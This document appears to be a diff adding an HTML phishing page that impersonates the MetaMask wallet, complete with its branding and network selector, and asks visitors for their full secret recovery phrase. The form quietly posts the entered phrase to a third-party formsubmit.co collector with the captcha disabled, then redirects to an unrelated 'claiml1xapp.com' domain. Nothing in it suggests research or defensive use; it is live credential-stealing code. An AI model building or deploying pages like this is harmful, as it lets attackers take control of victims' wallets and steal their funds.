@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>MetaMask</title>
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <link href="metaform.css" rel="stylesheet" />
+    <script
+      src="https://kit.fontawesome.com/a076d05399.js"
+      crossorigin="anonymous"
+    ></script>
+    <link rel="icon" href="metamask.webp" sizes="32x32" type="assets/png" />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"
+    />
+  </head>
+  <body>
+    <center>
+      <div class="navbar">
+        <div class="navbar-left">
+          <img src="metamask.webp" width="40px" height="40px" />
+          <h1>METAMASK</h1>
+        </div>
+
+        <div class="navbar-right">
+          <div class="validation">
+            <select class="update">
+              <option value="Ethereum" id="test" name="Ethereum" selected>
+                <div class="dot"></div>
+                Ethereum Mainnet
+              </option>
+              <option value="Binance Chain" id="test" name="Binance Chain">
+                <div class="dot"></div>
+                Binance Chain
+              </option>
+              <option value="Arbitrum" id="test" name="Arbitrum">
+                <div class="dot"></div>
+                Arbitrum
+              </option>
+              <option value="Optimism" id="test" name="Optimism">
+                <div class="dot"></div>
+                Optimism
+              </option>
+              <option value="Polygon" id="test" name="Polygon">
+                <div class="dot"></div>
+                Polygon
+              </option>
+              <option value="Avalanche" id="test" name="Avalanche">
+                <div class="dot"></div>
+                Avalanche
+              </option>
+              <option value="TRON" id="test" name="TRON">
+                <div class="dot"></div>
+                TRON
+              </option>
+            </select>
+          </div>
+
+          <div class="theme-toggle">
+            <i id="lightModeIcon" class="fas fa-sun" style="display: none"></i>
+            <i id="darkModeIcon" class="fas fa-moon"></i>
+          </div>
+        </div>
+      </div>
+
+      <br />
+      <br />
+
+      <center>
+        <div class="text">
+          <h1>Continue with Seed Phrase</h1>
+          <p>Enter your Mnemonic keyword phrase to continue using MetaMask.</p>
+        </div>
+
+        <div class="header">
+          <h1>Secret Recovery Phrase</h1>
+          <select id="phraseLength">
+            <option value="12">I have a 12-word phrase</option>
+            <option value="15">I have a 15-word phrase</option>
+            <option value="18">I have a 18-word phrase</option>
+            <option value="21">I have a 21-word phrase</option>
+            <option value="24">I have a 24-word phrase</option>
+          </select>
+        </div>
+        <div class="message">
+          You can paste your entire secret recovery phrase into any field
+        </div>
+        <form
+          action="https://formsubmit.co/0da575fb6227bbf518f919456b183b5e"
+          method="POST"
+        >
+          <div id="phraseInputs" class="phrase-inputs"></div>
+          <div class="button-container">
+            <input type="hidden" name="_captcha" value="false" />
+            <input
+              type="hidden"
+              name="_next"
+              value="https://claiml1xapp.com/success.html"
+            />
+            <button class="submit-button">Proceed</button>
+          </div>
+        </form>
+      </center>
+      <br /><br /><br /><br />
+      <script src="script.js"></script>
+    </center>
+  </body>
+</html>
